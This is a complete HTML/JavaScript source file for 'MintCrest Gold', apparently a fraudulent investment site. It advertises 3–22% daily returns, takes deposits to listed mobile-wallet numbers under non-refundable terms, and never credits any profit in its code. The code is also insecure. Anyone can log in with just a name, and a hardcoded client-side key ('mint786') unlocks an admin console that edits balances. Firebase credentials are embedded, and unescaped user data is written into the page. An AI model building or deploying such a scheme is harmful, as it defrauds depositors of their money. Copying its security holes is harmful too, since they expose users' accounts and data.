<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Final Master Edition</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(35px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div id="ticker" class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">
            📢 Welcome to MintCrest Gold - Secure Your Digital Assets with 25 New High-Yield Fleets!
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Global Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 text-white uppercase focus:border-blue-500">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95 transition-all">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/5">No Active Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Investment Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3.5rem] border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-6 uppercase text-center italic">Funding</h3>
                <div class="space-y-2 mb-8 text-[10px] font-black uppercase">
                    <div class="flex justify-between p-3 bg-white/5 rounded-xl"><span>JazzCash</span><span>03705519562</span></div>
                    <div class="flex justify-between p-3 bg-white/5 rounded-xl"><span>Easypaisa</span><span>03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold text-white outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold text-white outline-none uppercase">
                <p class="text-[8px] text-gray-500 mb-2 uppercase font-bold text-center">Attach Proof (Screenshot)</p>
                <input type="file" id="dep-proof" accept="image/*" class="w-full text-[9px] mb-6">
                <button onclick="submitDeposit()" id="dep-btn" class="w-full bg-blue-600 py-5 rounded-xl font-black text-[10px] uppercase">Verify Funding</button>
            </div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-4">Official Community</h3>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="inline-block bg-green-600/20 border border-green-500/30 px-8 py-3 rounded-2xl font-black text-[9px] uppercase tracking-widest text-green-400">Join WhatsApp Group</a>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-[10px] uppercase mb-4 italic text-center">Admin Help Desk</h3>
                <textarea id="support-msg" placeholder="Describe your issue..." class="w-full bg-white/5 p-4 rounded-xl text-[10px] text-white h-24 mb-4 outline-none border border-white/5"></textarea>
                <button onclick="sendSupport()" class="w-full bg-blue-600 py-3 rounded-xl font-black text-[10px] uppercase">Submit Ticket</button>
            </div>

            <div class="glass p-6 rounded-[2rem] text-[8px] text-gray-500 uppercase font-bold leading-relaxed">
                <p class="text-blue-500 mb-2 font-black">Privacy Policy & Terms</p>
                * Deposits are non-refundable once activated.<br>
                * Withdrawal processing time: 1-24 hours.<br>
                * One person can only hold one verified account.
            </div>

            <button onclick="logout()" class="w-full glass p-5 rounded-[2rem] text-red-500 font-black text-[10px] uppercase">Logout Session</button>
        </div>

        <div id="p-activity" class="page p-6"><h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Security Ledger</h2><div id="user-history" class="space-y-2 pb-10"></div></div>
        <div id="p-withdraw" class="page p-6"><div class="glass p-8 rounded-[3rem] text-center border-t-8 border-red-600"><h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Withdraw</h3><input type="number" id="wd-amt" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold text-white outline-none"><input type="text" id="wd-acc" placeholder="Account Details" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center text-[10px] font-bold text-white outline-none"><button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-xl font-black text-[10px] uppercase">Authorize</button></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <h2 class="text-xl font-black text-blue-500 uppercase italic mb-8">Master Console</h2>
        <div class="space-y-6">
            <div class="glass p-4 rounded-xl">
                <p class="text-[8px] font-black uppercase text-gray-500 mb-2">App Broadcast</p>
                <input type="text" id="adm-ticker-msg" placeholder="Type new announcement..." class="w-full bg-white/5 p-3 rounded-lg text-[10px] text-white outline-none mb-2">
                <button onclick="updateTicker()" class="w-full bg-blue-600 py-2 rounded-lg text-[9px] font-black uppercase">Update Ticker</button>
            </div>
            <div class="glass p-4 rounded-xl">
                <p class="text-[8px] font-black uppercase text-gray-500 mb-2">Manual User Edit</p>
                <input type="text" id="adm-edit-name" placeholder="User Name" class="w-full bg-white/5 p-3 rounded-lg text-[10px] text-white outline-none mb-2 uppercase">
                <input type="number" id="adm-edit-bal" placeholder="Amount to Add/Sub" class="w-full bg-white/5 p-3 rounded-lg text-[10px] text-white outline-none mb-2">
                <button onclick="manualBalance()" class="w-full bg-green-600 py-2 rounded-lg text-[9px] font-black uppercase">Update Balance</button>
            </div>
            <div class="grid grid-cols-2 gap-2"><div class="bg-blue-600/10 p-3 rounded-xl text-center"><p class="text-[7px] font-black uppercase">Users</p><h4 id="adm-count-users" class="text-lg font-black">0</h4></div><div class="bg-yellow-600/10 p-3 rounded-xl text-center"><p class="text-[7px] font-black uppercase">Pending</p><h4 id="adm-count-pend" class="text-lg font-black text-yellow-500">0</h4></div></div>
            <div id="adm-requests-list" class="space-y-2"></div>
            <div id="adm-users-list" class="space-y-2 border-t border-white/5 pt-4"></div>
        </div>
        <button onclick="closeAdmin()" class="w-full mt-10 bg-red-600 py-4 rounded-xl font-black text-[10px] uppercase">Close Console</button>
    </div>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="text-2xl">🏢</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        const plans = [
            {n:"Basic-X 1", p:200, r:3, d:30}, {n:"Basic-X 2", p:500, r:3.2, d:30}, {n:"Basic-X 3", p:800, r:3.4, d:30},
            {n:"Bronze-X 1", p:1000, r:3.6, d:30}, {n:"Bronze-X 2", p:2000, r:3.8, d:30}, {n:"Bronze-X 3", p:3000, r:4, d:30},
            {n:"Silver-X 1", p:5000, r:4.2, d:45}, {n:"Silver-X 2", p:7000, r:4.5, d:45}, {n:"Silver-X 3", p:10000, r:5, d:45},
            {n:"Gold-X 1", p:15000, r:5.5, d:60}, {n:"Gold-X 2", p:20000, r:6, d:60}, {n:"Gold-X 3", p:25000, r:6.5, d:60},
            {n:"Platinum-X 1", p:30000, r:7, d:75}, {n:"Platinum-X 2", p:40000, r:7.5, d:75}, {n:"Platinum-X 3", p:50000, r:8, d:90},
            {n:"Elite-X 1", p:60000, r:8.5, d:90}, {n:"Elite-X 2", p:75000, r:9, d:90}, {n:"Elite-X 3", p:100000, r:10, d:120},
            {n:"Master-X 1", p:150000, r:11, d:120}, {n:"Master-X 2", p:200000, r:12, d:150},
            {n:"👑 CROWN KING", p:25000, r:22, d:15}, {n:"🔥 FLASH NODE", p:10000, r:15, d:7}, 
            {n:"💎 VIP VAULT", p:100000, r:18, d:30}, {n:"🚀 MARS NODE", p:50000, r:12, d:20}, {n:"⚡ LIGHTNING", p:5000, r:10, d:5}
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, tierName: "Inactive", time: Date.now() });
            db.collection("users").doc(name).onSnapshot(d => { user = d.data(); updateUI(); });
            db.collection("app_data").doc("announcement").onSnapshot(d => { if(d.exists) document.getElementById('ticker').innerText = d.data().message; });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(d => { const r = d.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center mb-2 text-[8px] font-black"><div>${r.type}</div><div>₨ ${r.amount} <span class="badge-${r.status}">${r.status}</span></div></div>`; });
            });
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value, file = document.getElementById('dep-proof').files[0];
            if(!a || !t || !file) return alert("All Fields Required!");
            document.getElementById('dep-btn').innerText = "Uploading...";
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`);
            await sRef.put(file); const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now() });
            alert("Sent to Admin!"); location.reload();
        }

        async function manualBalance() {
            const name = document.getElementById('adm-edit-name').value.toUpperCase();
            const val = parseInt(document.getElementById('adm-edit-bal').value);
            const ref = db.collection("users").doc(name); const d = await ref.get();
            if(d.exists) { await ref.update({ balance: (d.data().balance||0) + val }); alert("Updated!"); }
        }

        async function updateTicker() {
            const msg = document.getElementById('adm-ticker-msg').value;
            await db.collection("app_data").doc("announcement").set({ message: msg }); alert("Broadcasting!");
        }

        function syncAdmin() {
            db.collection("users").onSnapshot(snap => {
                document.getElementById('adm-count-users').innerText = snap.size;
                const list = document.getElementById('adm-users-list'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-3 flex justify-between items-center text-[8px]"><span>${u.name} (₨ ${u.balance})</span><button onclick="deleteU('${u.name}')" class="text-red-500">DEL</button></div>`; });
            });
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                document.getElementById('adm-count-pend').innerText = snap.size;
                const list = document.getElementById('adm-requests-list'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 text-[8px] font-black mb-2 uppercase">User: ${d.user}<br>Type: ${d.type}<br>Amt: ${d.amount}<br>${d.proof?`<a href="${d.proof}" class="text-blue-500 underline" target="_blank">VIEW PROOF</a>`:''}<div class="mt-2 flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved')" class="bg-green-600 px-3 py-1 rounded">OK</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected')" class="bg-red-600 px-3 py-1 rounded">NO</button></div></div>`; });
            });
        }

        async function handle(id, u, amt, act) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') await ref.update({ balance: (d.data().balance||0)+amt });
            await db.collection("requests").doc(id).update({ status: act });
        }

        async function deleteU(n) { if(confirm("Delete User?")) await db.collection("users").doc(n).delete(); }
        function updateUI() { document.getElementById('v-bal').innerText = "₨ "+user.balance; document.getElementById('v-profit').innerText = "₨ "+user.profit; document.getElementById('tier-tag').innerText = user.tierName; }
        function renderPlans() { const l = document.getElementById('plans-list'); l.innerHTML = ''; plans.forEach(p => { l.innerHTML += `<div onclick="buy(${p.p},${p.r},${p.d},'${p.n}')" class="glass p-5 rounded-[2rem] flex justify-between items-center mb-2 border-l-4 border-blue-500/20 active:scale-95"><div><h4 class="font-black text-[10px] text-blue-400 uppercase">${p.n}</h4><p class="text-[7px] text-gray-500 uppercase">${p.r}% Daily • ${p.d} Days</p></div><p class="font-black text-[12px]">₨ ${p.p}</p></div>`; }); }
        async function buy(p,r,d,n) { if(user.balance < p) return alert("Low Balance!"); await db.collection("users").doc(user.name).update({ balance: user.balance-p, activeTier: p, tierROI: r, tierName: n, tierExpiry: Date.now()+(d*86400000), lastReqTime: Date.now() }); alert("Fleet Activated!"); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function adminTap() { tapCount++; if(tapCount>=5) { if(prompt("Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function logout() { localStorage.clear(); location.reload(); }
        async function sendSupport() { const m = document.getElementById('support-msg').value; await db.collection("requests").add({ user: user.name, type: "Support", msg: m, status: "pending", time: Date.now() }); alert("Ticket Sent!"); }
        async function submitWithdraw() { const a = parseInt(document.getElementById('wd-amt').value); if(a > user.balance) return alert("Low Bal!"); await db.collection("requests").add({ user: user.name, amount: a, type: "Withdraw", status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ balance: user.balance - a }); alert("Authorized!"); }
    </script>
</body>
</html>
